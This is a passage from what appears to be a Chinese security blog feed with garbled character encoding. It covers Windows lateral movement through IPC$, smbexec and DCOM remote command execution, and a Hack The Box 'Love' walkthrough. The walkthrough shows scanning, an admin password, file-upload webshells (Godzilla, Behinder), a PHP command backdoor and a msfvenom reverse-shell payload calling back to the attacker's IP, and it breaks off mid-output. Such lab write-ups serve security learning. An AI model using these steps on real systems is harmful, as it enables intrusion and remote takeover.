title="2.impacketç‰ˆ"></a>2.impacketç‰ˆ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec_impacket.exe jiye/administrator:11@10.10.10.10</span><br></pre></td></tr></table></figure><h3 id="3-linuxå®‰è£…ç‰ˆ"><a href="#3-linuxå®‰è£…ç‰ˆ" class="headerlink" title="3.linuxå®‰è£…ç‰ˆ"></a>3.linuxå®‰è£…ç‰ˆ</h3><h2 id="0x10-DCOMçš„ä½¿ç”¨"><a href="#0x10-DCOMçš„ä½¿ç”¨" class="headerlink" title="0x10.DCOMçš„ä½¿ç”¨"></a>0x10.DCOMçš„ä½¿ç”¨</h2><h3 id="1-powershellè·å–DCOMç¨‹åºåˆ—è¡¨"><a href="#1-powershellè·å–DCOMç¨‹åºåˆ—è¡¨" class="headerlink" title="1.powershellè·å–DCOMç¨‹åºåˆ—è¡¨"></a>1.powershellè·å–DCOMç¨‹åºåˆ—è¡¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance Win32_DCOMApplication  #server 2012ç‰ˆæœ¬ä»¥ä¸ŠGet-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication #win 7ã€server 2008ç­‰</span><br></pre></td></tr></table></figure><h3 id="2-DCOMæ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#2-DCOMæ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="2.DCOMæ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>2.DCOMæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h3><blockquote><p>è¿è¡Œcalc.exeï¼ŒåŒç†å°†calc.exeæ¢æˆæ¶æ„ç¨‹åºå³å¯</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">com=[activator]::CreateInstance([<span class="built_in">type</span>]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>))<span class="variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="variable">$null</span>,<span class="string">&quot;/c calc.exe&quot;</span>,<span class="string">&quot;Minimized&quot;</span>)</span></span><br></pre></td></tr></table></figure><h3 id="3-DCOMåœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤"><a href="#3-DCOMåœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤" class="headerlink" title="3.DCOMåœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤"></a>3.DCOMåœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤</h3><blockquote><p>ç¯å¢ƒ</p><p>åŸŸæ§ï¼šDCï¼ˆjiye.netï¼‰</p><p>IPï¼š10.10.10.10</p><p>userï¼šadministrator</p><p>passï¼š11</p><p>æˆå‘˜æœåŠ¡å™¨ï¼šWIN7</p><p>IPï¼š10.10.10.20</p><p>userï¼šDC1</p><p>passï¼š11</p></blockquote><p>ï¼ˆ1ï¼‰é¦–å…ˆå»ºç«‹ipc$è¿æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.10.10.10 &quot;11&quot; /user:jiye\administrator</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰è°ƒç”¨MMC20.Applicationæ‰§è¡Œè¿œç¨‹å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">com=[activator]::CreateInstance([<span class="built_in">type</span>]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;10.10.10.20&quot;</span>))<span class="variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="variable">$null</span>,<span class="string">&quot;/c calc.exe&quot;</span>,<span class="string">&quot;Minimized&quot;</span>)</span></span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰è°ƒç”¨{9BA05972-F6A8-11CF-A442-00A0C90A8F39} </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">com=[<span class="built_in">type</span>]::GetTypeFromCLSID(<span class="string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="string">&quot;10.10.10.20&quot;</span>)<span class="variable">$obj</span>=[System.Activator]::CreateInstance(<span class="variable">$com</span>)<span class="variable">$item</span>=<span class="variable">$obj</span>.item()<span class="variable">$item</span>.Document.Application.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c calc.exe&quot;</span>,<span class="string">&quot;c:\windows\system32&quot;</span>,<span class="variable">$null</span>,0)</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-Windowså¸¸ç”¨è¿œç¨‹è¿æ¥&quot;&gt;&lt;a href=&quot;#0x01-Windowså¸¸ç”¨è¿œç¨‹è¿æ¥&quot; class=&quot;headerlink&quot; title=&quot;0x01.Windowså¸¸ç”¨è¿œç¨‹è¿æ¥&quot;&gt;&lt;/a&gt;0x01.Windowså¸¸ç”¨è¿œç¨‹è¿æ¥&lt;/h2&gt;&lt;h3 id=&quot;1-IPC&quot;&gt;&lt;a href=&quot;#1-IPC&quot; class=&quot;headerlink&quot; title=&quot;1.IPC&quot;&gt;&lt;/a&gt;1.IPC&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;åˆ©ç”¨æ¡ä»¶ï¼Œå¼€å¯139ã€445ç«¯å£ï¼Œæ²¡æœ‰å…³é—­é»˜è®¤å…±äº«&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;C:\Users\Administrator&amp;gt;net use \\10.10.10.20\ipc$ &amp;quot;11&amp;quot; /user:administrator&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;å‘½ä»¤æˆåŠŸå®Œæˆã€‚&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;C:\Users\Administrator&amp;gt;net use&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ä¼šè®°å½•æ–°çš„ç½‘ç»œè¿æ¥ã€‚&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;çŠ¶æ€       æœ¬åœ°        è¿œç¨‹                      ç½‘ç»œ&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-------------------------------------------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;OK                     \\10.10.10.20\ipc$        Microsoft Windows Network&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;å‘½ä»¤æˆåŠŸå®Œæˆã€‚&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="å†…ç½‘æ¸—é€æµ‹è¯•" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="å†…ç½‘å®‰å…¨" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>HTB-love</title>
    <link href="https://lunamoore.github.io/2021/08/05/HTB-love/"/>
    <id>https://lunamoore.github.io/2021/08/05/HTB-love/</id>
    <published>2021-08-05T09:13:34.000Z</published>
    <updated>2021-08-05T09:28:11.567Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2021/08/05/HTB-love/image-20210805133747044.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><blockquote><p>ä¿¡æ¯å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°httpç«¯å£æœ‰80ã€5000ï¼Œåœ¨443ç«¯å£ä¸‹å¯ä»¥çœ‹åˆ°staging.love.htbï¼Œæ·»åŠ ä¸€æ¡hosts</p><p>10.10.10.239    staging.love.htb</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/love]</span><br><span class="line">â””â”€# nmap -sC -sV -sT 10.10.10.239 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-05 01:31 EDT</span><br><span class="line">Nmap scan report for staging.love.htb (10.10.10.239)</span><br><span class="line">Host is up (0.40s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">|_http-title: Secure file scanner</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in</span><br><span class="line">| Not valid before: 2021-01-18T14:00:16</span><br><span class="line">|_Not valid after:  2022-01-18T14:00:16</span><br><span class="line">445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   GetRequest, Help, LDAPSearchReq, NULL:</span><br><span class="line">|_    Host &#x27;10.10.17.216&#x27; is not allowed to connect to this MariaDB server</span><br><span class="line">5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3306-TCP:V=7.91%I=7%D=8/5%Time=610B77EA%P=x86_64-pc-linux-gnu%r(NUL</span><br><span class="line">SF:L,4B,&quot;G\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.17\.216&#x27;\x20is\x20not\x20allow</span><br><span class="line">SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(GetRequest,4</span><br><span class="line">SF:B,&quot;G\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.17\.216&#x27;\x20is\x20not\x20allowed\</span><br><span class="line">SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(Help,4B,&quot;G\0\0\</span><br><span class="line">SF:x01\xffj\x04Host\x20&#x27;10\.10\.17\.216&#x27;\x20is\x20not\x20allowed\x20to\x20</span><br><span class="line">SF:connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(LDAPSearchReq,4B,&quot;G\0\0\</span><br><span class="line">SF:x01\xffj\x04Host\x20&#x27;10\.10\.17\.216&#x27;\x20is\x20not\x20allowed\x20to\x20</span><br><span class="line">SF:connect\x20to\x20this\x20MariaDB\x20server&quot;);</span><br><span class="line">Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h45m34s, deviation: 4h02m32s, median: 25m32s</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_10::-</span><br><span class="line">|   Computer name: Love</span><br><span class="line">|   NetBIOS computer name: LOVE\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2021-08-04T22:58:30-07:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2021-08-05T05:58:29</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 143.66 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x02-è®¿é—®80ç«¯å£"><a href="#0x02-è®¿é—®80ç«¯å£" class="headerlink" title="0x02.è®¿é—®80ç«¯å£"></a>0x02.è®¿é—®80ç«¯å£</h2><p><code>å°±ä¸€ä¸ªç™»å…¥æ¡†</code></p><img src="/2021/08/05/HTB-love/image-20210805134721475.png" class><h2 id="0x03-è®¿é—®5000ç«¯å£"><a href="#0x03-è®¿é—®5000ç«¯å£" class="headerlink" title="0x03.è®¿é—®5000ç«¯å£"></a>0x03.è®¿é—®5000ç«¯å£</h2><p><code>å‘ç°æ²¡æœ‰æƒé™</code></p><img src="/2021/08/05/HTB-love/image-20210805134818437.png" class><h2 id="0x04-åˆ—ä¸€ä¸‹ç›®å½•"><a href="#0x04-åˆ—ä¸€ä¸‹ç›®å½•" class="headerlink" title="0x04.åˆ—ä¸€ä¸‹ç›®å½•"></a>0x04.åˆ—ä¸€ä¸‹ç›®å½•</h2><p><code>å¯ä»¥å‘ç°admin dist images includes pluginsï¼Œè®¿é—®è¿™äº›ç›®å½•å¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆæ•æ„Ÿä¿¡æ¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/love]</span><br><span class="line">â””â”€# gobuster dir -u http://10.10.10.239 -w /usr/share/wordlists/dirb/common.txt -t 50</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.10.239</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 50</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/08/05 01:49:07 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.htpasswd            (Status: 403) [Size: 302]</span><br><span class="line">/.htaccess            (Status: 403) [Size: 302]</span><br><span class="line">/.hta                 (Status: 403) [Size: 302]</span><br><span class="line">/ADMIN                (Status: 301) [Size: 337] [--&gt; http://10.10.10.239/ADMIN/]</span><br><span class="line">/Admin                (Status: 301) [Size: 337] [--&gt; http://10.10.10.239/Admin/]</span><br><span class="line">/admin                (Status: 301) [Size: 337] [--&gt; http://10.10.10.239/admin/]</span><br><span class="line">/aux                  (Status: 403) [Size: 302]</span><br><span class="line">/cgi-bin/             (Status: 403) [Size: 302]</span><br><span class="line">/com2                 (Status: 403) [Size: 302]</span><br><span class="line">/com3                 (Status: 403) [Size: 302]</span><br><span class="line">/com1                 (Status: 403) [Size: 302]</span><br><span class="line">/con                  (Status: 403) [Size: 302]</span><br><span class="line">/dist                 (Status: 301) [Size: 336] [--&gt; http://10.10.10.239/dist/]</span><br><span class="line">/examples             (Status: 503) [Size: 402]</span><br><span class="line">/images               (Status: 301) [Size: 338] [--&gt; http://10.10.10.239/images/]</span><br><span class="line">/Images               (Status: 301) [Size: 338] [--&gt; http://10.10.10.239/Images/]</span><br><span class="line">/includes             (Status: 301) [Size: 340] [--&gt; http://10.10.10.239/includes/]</span><br><span class="line">/index.php            (Status: 200) [Size: 4388]</span><br><span class="line">/licenses             (Status: 403) [Size: 421]</span><br><span class="line">/lpt1                 (Status: 403) [Size: 302]</span><br><span class="line">/lpt2                 (Status: 403) [Size: 302]</span><br><span class="line">/nul                  (Status: 403) [Size: 302]</span><br><span class="line">/phpmyadmin           (Status: 403) [Size: 302]</span><br><span class="line">/plugins              (Status: 301) [Size: 339] [--&gt; http://10.10.10.239/plugins/]</span><br><span class="line">/prn                  (Status: 403) [Size: 302]</span><br><span class="line">/server-status        (Status: 403) [Size: 421]</span><br><span class="line">/server-info          (Status: 403) [Size: 421]</span><br><span class="line">/webalizer            (Status: 403) [Size: 302]</span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line">2021/08/05 01:49:46 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x05-è®¿é—®adminç›®å½•"><a href="#0x05-è®¿é—®adminç›®å½•" class="headerlink" title="0x05.è®¿é—®adminç›®å½•"></a>0x05.è®¿é—®adminç›®å½•</h2><p><code>è¿™é‡Œçš„adminç›®å½•ä¸é»˜è®¤ç™»å…¥æ¡†è¿˜æœ‰äº›ä¸åŒ</code></p><img src="/2021/08/05/HTB-love/image-20210805135557560.png" class><h2 id="0x06-è®¿é—®åŸŸåstaging-love-htb"><a href="#0x06-è®¿é—®åŸŸåstaging-love-htb" class="headerlink" title="0x06.è®¿é—®åŸŸåstaging.love.htb"></a>0x06.è®¿é—®åŸŸåstaging.love.htb</h2><p><code>å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªç½‘é¡µçˆ¬è™«å·¥å…·ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªdemoç¤ºä¾‹</code></p><img src="/2021/08/05/HTB-love/image-20210805135725119.png" class><img src="/2021/08/05/HTB-love/image-20210805135836932.png" class><p><code>æµ‹è¯•80ä¸5000ç«¯å£</code></p><img src="/2021/08/05/HTB-love/image-20210805140036148.png" class><p><code>åœ¨5000ç«¯å£å¾—åˆ°adminå£ä»¤</code></p><img src="/2021/08/05/HTB-love/image-20210805140147979.png" class><h2 id="0x07-adminç™»å…¥"><a href="#0x07-adminç™»å…¥" class="headerlink" title="0x07.adminç™»å…¥"></a>0x07.adminç™»å…¥</h2><blockquote><p>user:admin</p><p>pass:@LoveIsInTheAir!!!!</p></blockquote><img src="/2021/08/05/HTB-love/image-20210805140538037.png" class><p><code>æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°å¯ä»¥åœ¨photoå¤„ä¸Šä¼ æ–‡ä»¶ï¼Œä¹‹åæµ‹è¯•ï¼Œå‘ç°æ–‡ä»¶ç±»å‹ä¸é™åˆ¶</code></p><img src="/2021/08/05/HTB-love/image-20210805141121416.png" class><p><code>ä¸Šä¼ kaliè‡ªå¸¦åå¼¹shellä½†æ˜¯å¤±è´¥äº†</code></p><img src="/2021/08/05/HTB-love/image-20210805141504716.png" class><h2 id="0x08-ä½¿ç”¨Godzilla"><a href="#0x08-ä½¿ç”¨Godzilla" class="headerlink" title="0x08.ä½¿ç”¨Godzilla"></a>0x08.ä½¿ç”¨Godzilla</h2><h3 id="1-é¦–å…ˆç”Ÿæˆshell"><a href="#1-é¦–å…ˆç”Ÿæˆshell" class="headerlink" title="1.é¦–å…ˆç”Ÿæˆshell"></a>1.é¦–å…ˆç”Ÿæˆshell</h3><img src="/2021/08/05/HTB-love/image-20210805141842273.png" class><img src="/2021/08/05/HTB-love/image-20210805141913586.png" class><img src="/2021/08/05/HTB-love/image-20210805141952344.png" class><h3 id="2-ä¸Šä¼ "><a href="#2-ä¸Šä¼ " class="headerlink" title="2.ä¸Šä¼ "></a>2.ä¸Šä¼ </h3><img src="/2021/08/05/HTB-love/image-20210805142101197.png" class><img src="/2021/08/05/HTB-love/image-20210805142138490.png" class><h3 id="3-è®¿é—®get-shell"><a href="#3-è®¿é—®get-shell" class="headerlink" title="3.è®¿é—®get shell"></a>3.è®¿é—®get shell</h3><p><code>Godzillaæ·»åŠ ç›®æ ‡</code></p><img src="/2021/08/05/HTB-love/image-20210805142304611.png" class><img src="/2021/08/05/HTB-love/image-20210805142745654.png" class><p><code>è¿™é‡Œä½¿ç”¨Godzillaåå¼¹meterpreter shellå¤±è´¥äº†</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:5555 </span><br><span class="line">[*] Sending stage (39282 bytes) to 10.10.10.239</span><br><span class="line">[*]  - Meterpreter session 1 closed.  Reason: Died</span><br><span class="line">[-] Meterpreter session 1 is not valid and will be closed</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x09-ä½¿ç”¨Behinder"><a href="#0x09-ä½¿ç”¨Behinder" class="headerlink" title="0x09.ä½¿ç”¨Behinder"></a>0x09.ä½¿ç”¨Behinder</h2><p><code>Godzillaåå¼¹shellå¤±è´¥äº†ï¼Œè¿™é‡Œä½¿ç”¨BehinderæˆåŠŸäº†ï¼Œä½†æ˜¯ä¹Ÿä¸èƒ½ææƒã€‚ã€‚ã€‚ã€‚</code></p><img src="/2021/08/05/HTB-love/image-20210805154044687.png" class><h2 id="0x10-ææƒ"><a href="#0x10-ææƒ" class="headerlink" title="0x10.ææƒ"></a>0x10.ææƒ</h2><p><code>ä½¿ç”¨msfvenomææƒ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[/usr/share/webshells/php]</span><br><span class="line">â””â”€# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.216 LPORT=6666 -f exe &gt; /root/htb/love/sb.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">                                       </span><br></pre></td></tr></table></figure><p><code>å…ˆä¸Šä¼ ä¸€ä¸ªå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å°é©¬ï¼Œå†ä¸Šä¼ sb.exeåå¼¹shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_REQUEST[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span></span><br><span class="line">        echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">        $cmd = ($_REQUEST[&#x27;cmd&#x27;]);</span><br><span class="line">        system($cmd);</span><br><span class="line">        echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">        die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2021/08/05/HTB-love/image-20210805155845897.png" class><img src="/2021/08/05/HTB-love/image-20210805155927060.png" class><p><code>å¼€å¯msfç›‘å¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ---- 